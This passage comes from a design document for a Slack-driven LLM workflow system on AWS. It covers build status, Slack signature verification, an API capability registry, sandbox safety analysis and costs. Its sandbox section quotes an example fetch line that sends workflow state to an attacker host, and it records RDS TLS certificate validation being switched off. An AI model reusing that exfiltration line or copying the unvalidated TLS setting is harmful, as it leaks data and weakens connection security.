| `v3.2-step-processor-complete` | Step Processor fully operational: run-workflow.mjs, step-executor.mjs, template-resolver.mjs. First successful create_domain end-to-end (WorkflowRun 12 — PGD_Recipes, PGD_Ingredients, PGD_RecipeTags). help workflow through Step Processor |
| `v3.2-tangential-features` | /create-domain + /help fully wired to Step Processor. proc/create-domain.mjs as Step Processor entry point. dev_scripts/upsert-workflow.mjs. seed_PGC_Workflow.json: create_domain v2 (8 steps) + help (3 steps) + create_workflow stub |

---

## 9. Build Order — Remaining Work

~~1. Callback abstraction~~              ✅ complete — v3.2-callback-abstraction-complete
~~2. PGC workflow table templates~~      ✅ complete — v3.2-pgc-workflow-tables-complete
~~3. PROC — /create-domain (Phase 2b)~~ ✅ complete — v3.2-create-domain-scaffold
~~4. PROC — /create-domain (Phase 2c)~~ ✅ complete — v3.2-create-domain-live-llm
~~5. SERV-Table (getRows + insertRow)~~  ✅ complete — v3.2-serv-table-partial
~~6. PGC schema v2 — 13 tables + seeds~~ ✅ complete — v3.2-pgc-schema-v2-complete

### Phase 1 — Refactoring (in progress — complete before any new features)

Goal: align codebase with three-tier architecture. Eliminate ProcStepOrchestrator.
Make ProcFunction handle both HTTP and SQS. Make all proc endpoints transport-agnostic.
| Step | Task | Status |
|---|---|---|
| R1  | Update PGC JSON templates + drop/recreate PGC tables | ✅ complete |
| R2  | Add SERV_API_URL, LLM_AGENT_URL, LLM_CHAT_URL to SSM + template.yaml | ✅ complete |
| R3  | Create src/shared/sqs-callback.mjs — enqueueCallback() | ✅ complete |
| R4  | Create src/shared/lambda-utils.mjs — parseEvent + buildReqFromSqs | ✅ complete |
| R5  | Add processSqsBatch() to src/proc/handler.mjs | ✅ complete |
| R6  | Add SQS WorkflowQueue trigger to ProcFunction in template.yaml | ✅ complete |
| R7  | Remove ProcStepOrchestrator from template.yaml | ✅ complete |
| R8  | Move handleCreateDomain + callLlm into src/proc/create-domain.mjs — transport-agnostic | ✅ complete |
| R9  | Replace invokeServ Lambda invoke with fetch(SERV_API_URL) | ✅ complete — landed in R6/R8 |
| R10 | Delete src/proc/step-orchestrator.mjs | ✅ complete |
| R11 | Update all imports from ping-utils.mjs → lambda-utils.mjs | ✅ complete |
| R12 | Rename workflowId → traceId in all SQS payloads and UI messages | ✅ complete |
| R13 | Move PGC_Prompt, PGC_Workflow, PGC_IntentMap seeds into init-brain.mjs | ✅ complete — landed in R1/R8 |
| R14 | Move FK + constraint normalisation into buildCreateTableSQL in init-brain.mjs | ✅ complete — v3.2-r14-r15-complete |
| R15 | Add response_format json_schema back to callLlm Agent API call | ✅ complete — v3.2-r14-r15-complete |

Retest after each step — if any ping breaks, stop and fix before continuing.
Steps R6–R7 are highest risk: two Lambdas competing for WorkflowQueue. Move through them quickly.

### Phase 2 — New Features

| # | Task | Status |
|---|---|---|
| 1 | Slack /interactive endpoint + Slack signing verification (Section 12.2) | ✅ complete — v3.2-interactive-complete |
| 1a | /help command — interactive loop proof + permanent intent pipeline foundation | ✅ complete — v3.2-interactive-complete |
| 2 | /shutdown Slack command — emergency stop, ProcFunction + SlackbotFunction | ✅ complete — v3.2-shutdown-complete |
| 2a | SERV-Table updateRows + deleteRows | ✅ complete — v3.2-serv-table-complete |
| 2b | SERV-Entity — six routes, PGC_EntitySchema upsert_key | ✅ complete — v3.2-serv-entity-complete |
| 3a | shared/llm-client + shared/serv-client + proc/review-output (Ajv + semantic rules) + proc/design-domain foundation (LLM + validation + WorkflowRun lifecycle) | ✅ complete — v3.2-design-domain-e2e |
| 3b | proc/design-domain — Block Kit review message, in-place table remove, human gate pause | ✅ complete — v3.2-step-processor-complete |
| 3c | proc/create-domain — Step Processor entry point, full WorkflowRun lifecycle | ✅ complete — v3.2-step-processor-complete |
| 4 | PROC — Intent Preprocessor — coded logic + cheap LLM classification | ⬜ **next** |
| 5 | PROC — Step Processor — SQS-driven stack execution, full PGC_WorkflowRun lifecycle | ✅ complete — v3.2-step-processor-complete |
|   | — `run-workflow.mjs`: execute_top, resume_gate, cancel, iterator, human_gate suspend/resume | ✅ |
|   | — `step-executor.mjs`: llm_call, js_transform (built-in), human_gate (confirm + edit_list), serv_schema, serv_insert, notify, end, iterator | ✅ |
|   | — `template-resolver.mjs`: {{dot.path}} resolution, single-token raw-value fix | ✅ |
|   | — velocity detector, execution accumulator, cycle detector (Section 6.9) | ⬜ deferred — see tech debt register |
|   | — Step Processor checks PGC_WorkflowRun.status before executing (shutdown contract) | ✅ implemented |

**Step types — implemented vs deferred:**

| Type | Status | Notes |
|---|---|---|
| `llm_call` | ✅ live | Loads prompt from `PGC_Prompt`, calls LLM, runs `review-output` validation |
| `js_transform` | ✅ live (built-in only) | Built-in `columnSummary` enrichment only — generic AST sandbox Phase 3 |
| `human_gate` | ✅ live | `confirm` + `edit_list` proven end-to-end |
| `serv_schema` | ✅ live | `createTable` via SERV |
| `serv_insert` | ✅ live | `insertRow` via SERV |
| `notify` | ✅ live | Resolves `message_template`, enqueues `WORKFLOW_NOTIFY` |
| `end` | ✅ live | Marks run completed |
| `iterator` | ✅ live | Sequential only — one SQS hop per item |
| `serv_query` | ⬜ Phase 3 | Needed for duplicate domain detection pre-check |
| `serv_update` | ⬜ Phase 3 | |
| `serv_delete` | ⬜ Phase 3 | |
| `sub_workflow` | ⬜ Phase 3 | |
| `condition` | ⬜ Phase 3 | |
| `capability_call` | ⬜ Phase 3 | Not yet defined — see Section 15.1 |

**Gate types — implemented in `dialogToBlocks()` vs deferred:**

| Gate type | Status |
|---|---|
| `confirm` | ✅ live |
| `edit_list` | ✅ live — per-row Remove button, in-place `chat.update` re-render |
| `select_one` | ⬜ Phase 3 — `buildDialog()` stub exists |
| `select_many` | ⬜ Phase 3 — `buildDialog()` stub exists |
| `text_input` | ⬜ Phase 3 |
| `review_object` | ⬜ Phase 3 |

### Phase 3 — Deferred

| # | Task |
|---|---|
| 1 | SERV-Query — cross-entity parameterised SELECT with pagination |
| 2 | Generic `js_transform` sandbox — acorn AST gate + `vm.runInNewContext` |
| 3 | `serv_query`, `serv_update`, `serv_delete` step types |
| 4 | `sub_workflow` and `condition` step types |
| 5 | `capability_call` step type + External API Registry (Section 15.1) |
| 6 | Remaining gate types: `select_one`, `select_many`, `text_input`, `review_object` |
| 7 | pgvector semantic search — intent classification + prompt deduplication (Section 10) |
| 8 | Right brain — workflow improvement loop using `PGC_WorkflowStats` + `PGC_Prompt.error_log` |
| 9 | `create_workflow` workflow — LLM designs and stores a new `PGC_Workflow` row from natural language |
| 10 | Parallel execution — fan-out/fan-in, optimistic locking |
| 11 | Unit + integration tests — node:test, testcontainers |
| 12 | CI/CD — GitHub Actions / SAM pipeline / CodePipeline (after template.yaml stabilises) |

**Phase 2 remaining (before Phase 3):**

| # | Task |
|---|---|
| 4 | Intent Preprocessor (`classify-intent.mjs`) — three-tier: coded exact match → cheap LLM → heavy lift |
| 6 | `create_workflow` workflow stub — LLM designs and stores a new `PGC_Workflow` row |

## 10. pgvector — Semantic Search

Extension: pgvector (available on RDS PostgreSQL 15+, no extra cost)
Enable: CREATE EXTENSION IF NOT EXISTS vector;

Embedding model: text-embedding-3-small (OpenAI), 1536 dimensions
Used in: PGC_Workflow, PGC_DomainHelp, PGC_Prompt, PGC_IntentMap

Primary use cases:
- Intent preprocessor — find matching workflow by semantic similarity
- /help search — find domain by natural language description
- Prompt deduplication — avoid generating duplicate prompts

Status: Designed, not yet implemented. Add to ALLOWED_TYPES in schema.mjs
        when pgvector extension is enabled on RDS.

---

## 12. Security

### 12.1 Threat Model

evolving-mind-ai is a household-scale private deployment. The attack surfaces are:

- **Slack endpoints** — publicly reachable API Gateway URLs. Anyone who knows the URL
  can POST to them without authentication unless protected.
- **PROC endpoints** — business logic layer. A fake request can trigger LLM calls,
  DDL execution, or workflow cancellation.
- **SERV endpoints** — data layer. A fake request can read or write PGC/PGD tables.
- **Prompt injection** — malicious content in user input or LLM output attempting to
  manipulate workflow execution. Covered by the right-brain validation loop (Section 6.10).

### 12.2 Slack Endpoint Security — Signing Secret Verification

**All `/api/v1/ui/slack/*` routes verify the Slack signing secret before any routing
or business logic executes.** This is the official Slack-recommended mechanism and is
implemented in `src/ui/slackbot/handler.mjs`.

**How it works:**

Every genuine Slack request includes two headers:
- `X-Slack-Signature` — HMAC-SHA256 of `"v0:{timestamp}:{raw_body}"` signed with the
  signing secret
- `X-Slack-Request-Timestamp` — Unix timestamp of when Slack sent the request

The handler computes the expected signature independently and compares using
`timingSafeEqual` (Node.js `crypto`) — constant-time comparison that prevents
timing attacks. Requests that fail verification are rejected with `401` before
any business logic runs.

**Replay attack protection:** Requests with a timestamp older than 5 minutes are
rejected regardless of signature validity. This prevents an attacker from capturing
and replaying a legitimate Slack request.

**Implementation:**
```js
// src/ui/slackbot/handler.mjs
import { createHmac, timingSafeEqual } from 'crypto';

const sigBase  = `v0:${timestamp}:${rawBody}`;
const expected = 'v0=' + createHmac('sha256', signingSecret)
                           .update(sigBase, 'utf8')
                           .digest('hex');

if (!timingSafeEqual(Buffer.from(signature), Buffer.from(expected))) {
  return err(401, 'Unauthorized — invalid Slack signature');
}
```

**Exempt routes:** Ping routes (`ping-api`, `ping-sqs`, `ping-llm`, `ping-e2e`) bypass
signature verification. These are direct curl health checks that carry no Slack signature,
are read-only, and enqueue no business logic payloads. They are defined in `EXEMPT_ROUTES`
in `handler.mjs`.

**The `/interactive` endpoint** must apply the same verification — it is the highest-risk
surface because a forged button click can advance a live workflow run without user consent.
Verification is built in from day one, not added later.

**SSM parameter:** `/evolving-mind-ai/slack-signing-secret` — `SecureString`.
Injected into SlackbotFunction via `template.yaml` Environment block as `SLACK_SIGNING_SECRET`.

### 12.3 PROC and SERV Endpoint Security

PROC and SERV endpoints are not directly called from Slack — PROC is called by the
SQS WorkflowQueue (internal AWS) and by the operator via curl for testing. SERV is
called only by PROC via HTTP fetch to API Gateway.

**Current state:** No authentication on PROC or SERV endpoints. Anyone with the API
Gateway URL can call them.

**Target state:** AWS API Gateway resource policy restricting PROC and SERV to requests
originating from within the AWS account. This requires no application code changes —
it is a `template.yaml` / CloudFormation configuration only.

For curl testing, the operator authenticates with `aws-sigv4`:
```bash
curl --aws-sigv4 "aws:amz:us-east-2:execute-api"      --user "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY"      -X POST https://enwwi5aulf.execute-api.us-east-2.amazonaws.com/Prod/api/v1/proc/create-domain      -d '{"userInput":"recipes"}'
```

**Priority:** Medium — implement before any public exposure of PROC/SERV endpoints.
No action needed while the system is household-scale with a known operator.

### 12.4 Security Implementation Status

| Surface | Protection | Status |
|---|---|---|
| `/ui/slack/command` | Slack signing secret — HMAC-SHA256 + replay protection | ✅ Implemented |
| `/ui/slack/interactive` | Slack signing secret — same verifySlackSignature() | ✅ Implemented — v3.2-interactive-complete |
| `/proc/*` | AWS API Gateway resource policy — account-scoped | ⬜ Deferred — low risk at household scale |
| `/serv/*` | AWS API Gateway resource policy — account-scoped | ⬜ Deferred — low risk at household scale |
| Prompt injection | Right-brain validation loop — Ajv + AST gate | ⬜ Implemented with /proc/review-output (Phase 2 item 3a) |
| API keys (external callers) | API Gateway usage plans | ⬜ Phase 3 — only if external integrations added |

### 12.5 What Is Deliberately Not Done

- **No VPC on Lambda** — Lambda connects to RDS over public internet with SSL.
  This is a cost decision ($32/month NAT Gateway avoided). RDS uses
  `ssl: { rejectUnauthorized: false }` — connection is encrypted, cert not validated.
  Acceptable for household-scale private deployment. Final — do not suggest VPC.
- **No WAF** — AWS WAF adds ~$5-10/month minimum. Not justified at this scale.
- **No API keys on Slack endpoints** — Slack signing secret is the correct
  mechanism for Slack-originated requests. API keys would be redundant.


---

## 13. Refactoring Decisions — Completed

All Phase 1 refactoring is complete as of `v3.2-clean-baseline`.

| Decision | Rationale | Status |
|---|---|---|
| `ProcStepOrchestrator` eliminated — `ProcFunction` dual HTTP+SQS trigger | Eliminates Lambda-to-Lambda hop, reduces cold start surface | ✅ complete |
| `invokeServ` replaced with `fetch(SERV_API_URL)` | Cloud portability — Lambda invoke is AWS-only; HTTP fetch works anywhere | ✅ complete |
| All PROC endpoint modules transport-agnostic | No AWS SDK in business logic — `req.source` determines response path only | ✅ complete |
| `shared/ping-utils.mjs` → `shared/lambda-utils.mjs` | Accurate name — utility serves all Lambdas, not just pings | ✅ complete |
| `workflowId` → `traceId` throughout | `workflowId` conflated with `PGC_WorkflowRun.id` — `traceId` is accurate | ✅ complete |
| FK + constraint normalisation moved to `buildCreateTableSQL` | SERV layer owns DDL contract — PROC should not pre-process LLM output | ✅ complete |
| `response_format json_schema` restored on Agent API call | Model-level JSON enforcement reduces malformed output | ✅ complete |
| `SchemaQueue` + `LambdaInvokePolicy` removed from `template.yaml` | Orphaned resources — no trigger, no application references | ✅ complete |
| `PROC_FUNCTION_NAME` + stale env vars removed | Lambda invoke pattern gone — env vars were dead references | ✅ complete |

**Planned PROC endpoints** (documented in `openapi.yaml`):

| Endpoint | Description |
|---|---|
| `POST /proc/create-domain` | ✅ Live — monolithic LLM schema design + DDL execution |
| `POST /proc/design-domain` | ✅ Live — LLM design + validation + WorkflowRun lifecycle (Phase 2 item 3a) |
| `POST /proc/review-output` | ✅ Live — Ajv + semantic validation, 2-attempt correction loop |
| `POST /proc/shutdown` | ✅ Live — emergency stop, cancel active runs |
| `POST /proc/classify-intent` | ⬜ Phase 2 item 4 — Intent Preprocessor |
| `POST /proc/run-workflow` | ⬜ Phase 2 item 5 — Step Processor |
| `POST /proc/improve-prompt` | ⬜ Phase 3 — prompt evolution |


---

## 15. Tangential Features

Features discussed and designed but deferred — either because they require the Step
Processor to exist first, or because they represent a meaningful expansion of scope
that warrants explicit architectural review before implementation.

---

### 15.1 External API Registry — capability_call Step Type

#### The problem

The `js_transform` step type is restricted to pure synchronous data transformations.
External data enrichment from third-party APIs — fetching stock prices from Finnhub,
weather data, exchange rates — cannot be done safely in LLM-generated JS because:

- `vm.runInNewContext` timeout does not apply to async operations
- LLM-generated fetch calls are an exfiltration vector — a prompt injection attack
  or hallucinated URL could send workflow state to an attacker's endpoint
- API keys embedded in generated code are exposed in PGC_Workflow rows
- No rate limiting, retry logic, or circuit breaking on arbitrary fetch

Hardcoded service wrappers (e.g. `src/shared/finnhub-client.mjs`) solve the safety
problem but don't evolve — every new data source requires a new file and a deployment.

#### The design

The system maintains a **capability registry** of approved external integrations.
Each registered capability defines what can be called, how to authenticate, and
what parameters are allowed. The LLM generates workflow steps that reference
capability keys — it never constructs URLs, never sees API keys, and cannot call
anything outside the registry.

**PGC_Capability schema extension** (Phase 3 — current table tracks internal
capabilities only; these columns are added when the API Registry is built):

| Column | Type | Notes |
|---|---|---|
| base_url | text | Root URL for the API — e.g. https://finnhub.io/api/v1 |
| endpoints | jsonb | Named endpoint templates — e.g. { "quote": "/quote?symbol={{symbol}}" } |
| auth | jsonb | Auth config — { type: "query_param", key: "token", ssm_path: "/evolving-mind-ai/finnhub-api-key" } |
| allowed_params | jsonb | Whitelist of parameter names the LLM may supply — e.g. ["symbol", "resolution", "from", "to"] |
| rate_limit | text | Human-readable limit — e.g. "60/minute". Step Processor enforces via token bucket |
| timeout_ms | integer | Per-call timeout. Default 5000ms |

Auth credentials are stored in SSM, never in the database. The Step Processor
resolves the SSM path at execution time — the LLM never sees the value.

**New step type: capability_call**

The LLM generates a workflow step referencing a registered capability:

```json
{
  "step": 3,
  "type": "capability_call",
  "capability_key": "finnhub_quote",
  "endpoint": "quote",
  "params": { "symbol": "{{state.ticker}}" },
  "output_key": "current_price",
  "on_success": "next",
  "on_failure": "human_feedback"
}
```

The Step Processor resolves the capability definition, fetches the SSM key, constructs
the URL from the template substituting only whitelisted params, makes the fetch call
with timeout, and maps the response to output_key in workflow state.

**What the LLM controls:** which registered capability to call, which endpoint,
which whitelisted params with values from workflow state.

**What the LLM cannot control:** the base URL, auth credentials, non-whitelisted
params, or any URL not defined in the capability registry.

#### Finnhub integration — first capability

Finnhub provides stock quotes, historical price candles, and company profiles.
Seed row for PGC_Capability when the API Registry is built:

```json
{
  "capability_key": "finnhub",
  "category": "external_api",
  "description": "Finnhub stock market data — quotes, candles, company profiles",
  "status": "planned",
  "base_url": "https://finnhub.io/api/v1",
  "endpoints": {
    "quote":        "/quote?symbol={{symbol}}",
    "candles":      "/stock/candle?symbol={{symbol}}&resolution={{resolution}}&from={{from}}&to={{to}}",
    "company_info": "/stock/profile2?symbol={{symbol}}"
  },
  "auth": {
    "type": "query_param",
    "key": "token",
    "ssm_path": "/evolving-mind-ai/finnhub-api-key"
  },
  "allowed_params": ["symbol", "resolution", "from", "to"],
  "rate_limit": "60/minute",
  "timeout_ms": 5000
}
```

#### Example workflow — update stock portfolio prices

Once the Step Processor and capability_call are built, the LLM can generate a
workflow like "update current prices for all holdings" without any bespoke code:

```
Step 1 — serv_entity: listEntities(Holding) → state.holdings
Step 2 — js_transform: extract unique tickers from holdings → state.tickers
Step 3 — iterator over state.tickers (sequential):
  Step 3a — capability_call: finnhub/quote(symbol=ticker) → state.quote
  Step 3b — serv_entity: upsertEntity(StockPrice, { ticker, price, recorded_at: now })
Step 4 — notify: "Updated prices for N holdings"
```

Step 2 is a pure synchronous transform — safe for js_transform. Step 3a uses the
capability registry — controlled, auditable, rate-limited. No bespoke code. The
LLM generates this workflow definition the first time the user asks for it, stores
it in PGC_Workflow, and it runs from cache on every subsequent invocation.

#### Why this is in the spirit of an evolving mind

The brain doesn't grow by being able to call anything — it grows by learning which
registered capabilities solve which problems. When Finnhub is added to the registry,
the LLM can immediately propose workflows that use it. When IEX Cloud or a weather
API is added later, the same pattern applies with zero code changes. The LLM
discovers and composes capabilities; it doesn't implement them.

#### What needs to be built (Phase 3)

1. PGC_Capability schema extension — add the API Registry columns listed above
2. SSM parameter for Finnhub API key — /evolving-mind-ai/finnhub-api-key
3. New capability_call row in PGC_StepType seed data
4. Step Processor handler for capability_call — URL construction, SSM key resolution,
   fetch with timeout, response mapping to output_key
5. Finnhub seed row in PGC_Capability
6. Rate limiting — token bucket in PGC_WorkflowRun state or a dedicated table

---

### 15.2 js_transform Safety Analysis — Synchronous Constraint

This section captures the design analysis behind the js_transform synchronous-only
constraint documented in Section 6.10, for future reference if the constraint is
ever revisited.

#### The timeout problem

`vm.runInNewContext({ timeout: N })` in Node.js reliably kills synchronous infinite
loops. It does NOT apply to async operations. A function that does
`await fetch('https://attacker.com?data=' + JSON.stringify(state))` returns a Promise
immediately — the sandbox "completes" in microseconds and the async exfiltration
continues outside any timeout control.

This is not a Node.js bug — it is by design. The single-threaded event loop means
there is no thread to interrupt for async work.

#### Options considered

**Worker threads with terminate()** — `worker_thread` can be hard-killed regardless
of async state. Adds cold start overhead (~50–100ms), requires serialisation of
input/output across the thread boundary, and the security boundary is weaker than
vm since workers share the same V8 heap process.

**Dedicated sandbox Lambda** — invoke a separate Lambda with its own hard timeout
for JS execution. AWS enforces Lambda timeouts at the infrastructure level regardless
of async operations. Clean security boundary, true async timeout. Adds ~100ms
cold start latency and per-invocation Lambda cost. Viable for Phase 3+ if
js_transform needs I/O.

**Prohibit async in js_transform, use capability_call for I/O** — chosen approach.
The AST gate rejects any function containing async/await/fetch before execution.
Pure synchronous transforms remain in js_transform. All I/O goes through the
controlled capability registry. Clean separation, zero new infrastructure.

#### Why the chosen approach is correct for this system

The purpose of js_transform is data reshaping between steps — extracting fields,
computing derived values, merging objects. This work is inherently synchronous.
The desire for external API calls in a workflow step is not a js_transform concern —
it is a capability_call concern. The distinction between "transform data I already
have" and "fetch data I don't have" is architecturally meaningful and worth enforcing.

If a use case genuinely requires LLM-generated code that makes async I/O calls,
the correct path is the dedicated sandbox Lambda (Option B above), not relaxing
the js_transform constraint.

---

## 16. Cost of Ownership

### 16.1 Actual March 2026 Charges (us-east-2, household-scale dev)

Based on actual AWS billing data for March 2026 with the current infrastructure:

| Service | Usage | Raw Cost | Notes |
|---|---|---|---|
| RDS db.t4g.micro | ~294 hours | $4.71 | PostgreSQL 16.6, arm64 |
| RDS Storage | 20 GB gp2 | $0.91 | PGC + PGD databases |
| VPC Public IPv4 | ~563 hours | $2.82 | $0.005/hr per address — Bastion + RDS |
| EC2 (Bastion t3.nano) | ~294 hours | $1.78 | SSH access host |
| Secrets Manager | — | $0.16 | SSM parameters |
| Lambda | ~1M requests | ~$0.00 | Well within free tier |
| API Gateway | ~10K requests | ~$0.00 | Well within free tier |
| SQS | ~50K messages | ~$0.00 | Well within free tier |
| **Raw total** | | **~$10.38/month** | Before credits |
| AWS Free Tier / Promotional credits | | ($10.38) | Applied automatically |
| **Net payable** | | **$0.00** | During credit period |

**Key insight:** Lambda, API Gateway, and SQS are effectively free at household scale.
The dominant costs are the always-on infrastructure: RDS instance, Bastion host, and
the AWS public IPv4 charge introduced in 2024 ($0.005/hr per address).

### 16.2 Cost Breakdown by Component

| Component | Monthly Cost | Scales With |
|---|---|---|
| RDS db.t4g.micro (compute) | $4.71 | Instance class only — flat rate |
| RDS Storage | $0.91 | Data volume — $0.115/GB/month (gp2) |
| Bastion Host (t3.nano) | $1.78 | Instance running hours |
| Public IPv4 addresses | $2.82 | Number of attached IPs × hours |
| Lambda (4 functions) | ~$0.00 | Invocation count + duration |
| API Gateway | ~$0.00 | Request count |
| SQS (2 queues + 2 DLQs) | ~$0.00 | Message count |
| SSM Parameters | $0.16 | Number of SecureString parameters |
| **Total infrastructure** | **~$10.38** | |

### 16.3 Database Size Scenarios

evolving-mind-ai stores **structured relational data only** — rows of text, numbers,
dates, and jsonb. It does not store files, images, documents, or binary content.
For context: 1 GB of relational data holds roughly 5–10 million typical rows.
The 20 GB minimum RDS allocation is sufficient for years of household-scale use
across any realistic domain combination.

Storage scales at $0.115/GB/month (gp2, us-east-2).

| Scenario | Example Domains | Typical Data | Est. DB Size | Storage Cost | Total Monthly |
|---|---|---|---|---|---|
| Small | Recipes, golf scores | Hundreds of records per domain. A full recipe collection with ingredients and tasting notes — maybe 5,000 rows total | Under 1 GB | $0.23 | ~$10 |
| Medium | Inventory, budgets, stock portfolio, fitness tracking | Tens of thousands of records. A year of daily stock prices across 500 tickers is ~180K rows | 1–5 GB | $0.23–$0.58 | ~$10–$11 |
| Large | High-frequency data: sensor readings, transaction logs, web analytics | Millions of rows. 3 years of hourly readings across 100 sensors is ~2.6M rows | 5–15 GB | $0.58–$1.73 | ~$11–$13 |

**The 20 GB minimum allocation covers all three scenarios with room to spare.**
RDS storage only needs to grow beyond 20 GB when storing millions of rows of
high-frequency time-series data — a level of volume that household use rarely reaches.

For comparison: images, videos, and documents should never be stored in RDS.
Those belong in S3 — $0.023/GB/month, effectively unlimited. If evolving-mind-ai
ever needs to reference media files, the pattern is to store the S3 key in a
text column, not the file itself.

### 16.4 LLM Cost Estimates (Perplexity)

LLM is called **only for novel intents** — once per new domain design, once per
new workflow generation. Repeat operations use cached `PGC_Workflow` rows and cost $0.

Perplexity pricing (claude-sonnet-4-5 via Agent API, approximate):

| Operation | Tokens (approx) | Cost per call | Monthly estimate |
|---|---|---|---|
| `/create-domain` (design) | ~3K in / ~2K out | ~$0.025 | $0.25 (10 new domains/month) |
| `/create-domain` (correction attempt 2) | ~4K in / ~2K out | ~$0.035 | Occasional — <$0.10 |
| Workflow generation (future) | ~5K in / ~3K out | ~$0.045 | $0.45 (10 new workflows/month) |
| **Total LLM** | | | **~$0.50–$1.00/month** |

LLM cost is negligible at household scale. The design decision to cache workflows
in `PGC_Workflow` and reuse them means the LLM bill does not grow with usage —
only with novelty.

### 16.5 Total Cost of Ownership Summary

| Scenario | AWS Infrastructure | LLM | Total/Month |
|---|---|---|---|
| Small (recipes, golf, 2-3 domains) | ~$10 | $0.50 | ~$10–11/month |
| Medium (inventory, budgets, stock portfolio) | ~$10–11 | $0.75 | ~$11–12/month |
| Large (high-frequency time-series, 10+ domains) | ~$11–13 | $1.00 | ~$12–14/month |

Storage cost is nearly flat across all scenarios because structured relational data
is compact. The dominant cost driver at every scale is the always-on RDS instance
and Bastion host — not data volume.

### 16.6 Cost Reduction Opportunities

| Action | Monthly Saving | When to Apply |
|---|---|---|
| Replace Bastion with AWS SSM Session Manager | ~$1.78 + $0.94 IPv4 | When promotional credits near exhaustion |
| Switch RDS to Graviton2 Reserved Instance (1yr) | ~30% on compute (~$1.40) | After system stabilises |
| Stop RDS when not in use (dev only) | Up to $4.71 | Dev/test environments only — not production |
| Use RDS Aurora Serverless v2 | Variable — cheaper at low use | Phase 3 if usage patterns justify it |

**Highest impact action today:** Replacing the Bastion with SSM Session Manager
eliminates the EC2 instance ($1.78) and one public IPv4 address ($0.94) — saving
~$2.72/month with no loss of functionality. Tracked in tech debt register.